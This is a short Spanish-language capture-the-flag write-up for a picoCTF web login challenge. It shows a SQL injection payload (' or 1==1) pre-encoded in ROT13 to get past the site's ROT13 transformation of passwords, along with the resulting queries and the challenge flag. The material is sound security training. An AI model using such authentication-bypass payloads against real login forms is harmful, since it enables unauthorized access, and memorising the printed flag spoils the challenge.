## Objetivo 
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Solución  
```bash
password: ' or 1==1;
SQL query: SELECT * FROM admin where password = '' be 1==1;'

----------------------------------------------------------------
##ingresando la password invertida en rot13:

password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## Notas Adicionales 
ahora solo hay un campo de password, y al parecer se encryptan las passwords ingresadas, esto lo sabemos ya que active el modo debug que es un campo oculto dentro del codigo de la pagina, asi que trantando mas passwords diferentes nos damos cuenta que la encriptacion se trata de rot13 por lo cual podemos ingresar una password que ya este invertida, para que cuando se encripte con rot13 el output sea igual a lo que queremos inyectar, en este caso: `' or 1==1`
### Referencias

CyberChef (rot13)
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=JyBvciAxPT0xOw